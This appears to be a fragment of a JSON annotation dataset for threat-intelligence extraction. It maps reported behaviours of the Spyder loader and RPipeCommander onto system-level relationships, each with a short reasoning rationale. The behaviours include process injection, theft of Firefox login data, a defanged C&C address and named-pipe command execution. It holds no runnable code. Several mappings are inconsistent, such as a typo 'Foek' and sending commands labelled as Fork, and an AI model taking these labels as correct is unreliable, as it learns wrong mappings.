                "semantic_relationship": "[CoT]: The original relationship states that the Spyder loader injects content into the task.exe process. In system-level terms, this corresponds to the \"Inject\" relationship between two processes. This is a clear case of code injection where one process forces another process to execute its code, which aligns with the Process-to-Process:Inject relationship in the framework. [System-level Relationships]: <process:Spyder loader,Inject,process:task.exe>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The product detected a Spyder payload in memory, indicating a process-to-file relationship. [Original Relationships]: <process:our product,detected,file:Spyder payload>. ",
                "semantic_relationship": "[CoT]: The original relationship states that our product \"detected\" a Spyder payload in memory, which implies that the product inspected or read the payload file to detect it. Therefore, the system-level relationship is \"Read\" as it involves accessing the contents of the file. [System-level Relationships]: <process:our product,Read,file:Spyder payload>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The C&C server is hardcoded to a specific IP address, indicating a process-to-socket relationship. [Original Relationships]: <process:Spyder,hardcoded to,socket:61.238.103[.]165>. ",
                "semantic_relationship": "[CoT]: The original relationship \"hardcoded to\" implies that the Spyder process is explicitly connecting to the specified IP address, which aligns with the system-level relationship \"Connect\" between a process and a socket. [System-level Relationships]: <process:Spyder,Connect,socket:61.238.103[.]165>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: Multiple subdomains of junlper.com resolved to the same IP address, indicating a process-to-socket relationship. [Original Relationships]: <process:Spyder,resolved to,socket:61.238.103[.]165>. ",
                "semantic_relationship": "[CoT]: The original relationship \"resolved to\" indicates that the process Spyder established a connection to the socket 61.238.103[.]165, which aligns with the system-level relationship \"Connect\" between a process and a socket. [System-level Relationships]: <process:Spyder,Connect,socket:61.238.103[.]165>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The server has a self-signed TLS certificate with a specific thumbprint, indicating a process-to-file relationship. [Original Relationships]: <process:server,has,file:TLS certificate>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the server \"has\" a TLS certificate, which implies that the process is using the file (certificate) for TLS communication. In system-level terms, this translates to a \"Use\" relationship between the process and the file. [System-level Relationships]: <process:server,Use,file:TLS certificate>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The text states that the loader reads a hardcoded file named \"debug.png\" and XOR decrypts it, indicating a process-to-file relationship where the loader is the process reading the file.   [Original Relationships]: <process:loader,reads,file:debug.png>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the loader reads the file \"debug.png\". In system-level terms, this corresponds to the \"Read\" action between a process and a file. [System-level Relationships]: <process:loader,Read,file:debug.png>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The loader decrypts the buffer and injects it into a newly created, suspended svchost.exe process, showing a process-to-process relationship where the loader is the process injecting into svchost.exe.   [Original Relationships]: <process:loader,injects,process:svchost.exe>. ",
                "semantic_relationship": "[CoT]: The original relationship \"injects\" indicates that the loader process is performing code injection into the svchost.exe process. In the system-level relationships framework, this corresponds to the \"Inject\" relationship between two processes. [System-level Relationships]: <process:loader,Inject,process:svchost.exe>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The shellcode is executed in the context of svchost.exe, indicating a process-to-process relationship where the loader is the process executing the shellcode.   [Original Relationships]: <process:loader,executes,process:shellcode>. ",
                "semantic_relationship": "[CoT]: The original relationship \"executes\" indicates that the loader process is running or launching the shellcode, which directly maps to the system-level relationship \"Fork\" between processes. [System-level Relationships]: <process:loader,Fork,process:shellcode>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The shellcode reads the Firefox SQLite database as part of a password stealer, showing a process-to-file relationship where the shellcode is the process reading the database file.   [Original Relationships]: <process:shellcode,reads,file:Firefox SQLite database>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the shellcode is reading the Firefox SQLite database file. In the system-level relationships framework, this corresponds to the 'Read' action between a process and a file. [System-level Relationships]: <process:shellcode,Read,file:Firefox SQLite database>. "
            },
            {
                "phase": "execution",
                "relationship": "[Description]: The shellcode runs a query on the Firefox database, indicating a process-to-file relationship where the shellcode is the process running the query on the database file.   [Original Relationships]: <process:shellcode,runs,file:moz_logins query>. ",
                "semantic_relationship": "[CoT]: The original relationship states that the shellcode \"runs\" a query on the Firefox database. In system-level terms, this action involves reading data from the database file, hence the relationship is converted to \"Read\". The shellcode is the process performing the read operation on the file. [System-level Relationships]: <process:shellcode,Read,file:moz_logins query>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: RPipeCommander creates the named pipe \\\\.\\Pipe\\CmdPipe<PID>, indicating a process-to-file relationship where the process creates the pipe file. [Original Relationships]: <process:RPipeCommander,creates,file:\\\\.\\Pipe\\CmdPipe<PID>>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process creating a named pipe, which is a form of inter-process communication mechanism implemented as a file. In system-level terms, this corresponds to a 'Create' action between a process and a file. The named pipe is treated as a file since it is being created by the process. [System-level Relationships]: <process:RPipeCommander,Create,file:\\\\.\\Pipe\\CmdPipe<PID>>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: RPipeCommander reads from the named pipe \\\\.\\Pipe\\CmdPipe<PID>, indicating a process-to-file relationship where the process reads from the pipe file. [Original Relationships]: <process:RPipeCommander,reads from,file:\\\\.\\Pipe\\CmdPipe<PID>>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process reading from a named pipe, which is a form of inter-process communication (IPC) mechanism. In system-level terms, this corresponds to a \"Read\" action between a process and a file, as the process is consuming data from the pipe file. [System-level Relationships]: <process:RPipeCommander,Read,file:\\\\.\\Pipe\\CmdPipe<PID>>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: RPipeCommander writes into the named pipe \\\\.\\Pipe\\CmdPipe<PID>, indicating a process-to-file relationship where the process writes to the pipe file. [Original Relationships]: <process:RPipeCommander,writes into,file:\\\\.\\Pipe\\CmdPipe<PID>>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (RPipeCommander) writing data into a named pipe (\\\\.\\Pipe\\CmdPipe<PID>). In system-level terms, this corresponds to a 'Write' action from a process to a file. The action is explicitly stated as 'writes into' the file, which directly maps to the system-level 'Write' relationship. [System-level Relationships]: <process:RPipeCommander,Write,file:\\\\.\\Pipe\\CmdPipe<PID>>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: RPipeCommander accepts commands via the named pipe \\\\.\\Pipe\\CmdPipe<PID>, indicating a process-to-file relationship where the process accepts commands from the pipe file. [Original Relationships]: <process:RPipeCommander,accepts,file:\\\\.\\Pipe\\CmdPipe<PID>>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the process 'RPipeCommander' accepts commands via a named pipe file. In system-level terms, this corresponds to a 'Read' operation from the pipe file, as the process is receiving data (commands) from the pipe. [System-level Relationships]: <process:RPipeCommander,Read,file:\\\\.\\Pipe\\CmdPipe<PID>>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: RPipeCommander creates a process 'cmd.exe' , indicating a process-to-process relationship where the process creates the other process. [Original Relationships]: <process:RPipeCommander,creates,process:cmd.exe>. ",
                "semantic_relationship": "[CoT]: The original relationship states that RPipeCommander creates a new process 'cmd.exe'. In system-level terms, this corresponds to a 'Fork' operation where one process spawns another. The 'Fork' relationship is used to represent process creation in the system-level framework. [System-level Relationships]: <process:RPipeCommander,Fork,process:cmd.exe>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: RPipeCommander binds pipes to the process 'cmd.exe' , indicating a process-to-process relationship where the process binds pipes to the other process. [Original Relationships]: <process:RPipeCommander,binds,process:cmd.exe>. ",
                "semantic_relationship": "[CoT]: The original relationship states that RPipeCommander \"binds pipes\" to cmd.exe. In system-level terms, this action corresponds to establishing a pipe connection between two processes, which is represented as a \"Connect\" relationship in the Process-to-Process category. [System-level Relationships]: <process:RPipeCommander,Connect,process:cmd.exe>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: RPipeCommander sends commands to the 'cmd.exe' process, indicating a process-to-process relationship where the process sends commands to the other process. [Original Relationships]: <process:RPipeCommander,sends,process:cmd.exe>. ",
                "semantic_relationship": "[CoT]: The original relationship states that RPipeCommander \"sends\" commands to cmd.exe, which implies establishing a connection to the process. In system-level terms, this corresponds to a \"Foek\" relationship between the two processes. [System-level Relationships]: <process:RPipeCommander,Fork,process:cmd.exe>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: RPipeCommander reads the output of the 'cmd.exe' process, indicating a process-to-process relationship where the process reads from the other process. [Original Relationships]: <process:RPipeCommander,reads,process:cmd.exe>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that RPipeCommander reads the output of cmd.exe. In system-level terms, this corresponds to a 'Read' action from one process to another. The 'reads' relationship is therefore mapped to 'Receive'. [System-level Relationships]: <process:RPipeCommander,Receive,process:cmd.exe>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: RPipeCommander exits the 'cmd.exe' process by writing 'exit\\r\\n' , indicating a process-to-process relationship where the process exits the other process. [Original Relationships]: <process:RPipeCommander,exits,process:cmd.exe>. ",
                "semantic_relationship": "[CoT]: The original relationship states that RPipeCommander exits the 'cmd.exe' process. In system-level terms, this action is best represented as a 'Exit' relationship between the two processes. [System-level Relationships]: <process:RPipeCommander,Exit,process:cmd.exe>. "
            }
        ]
    }
]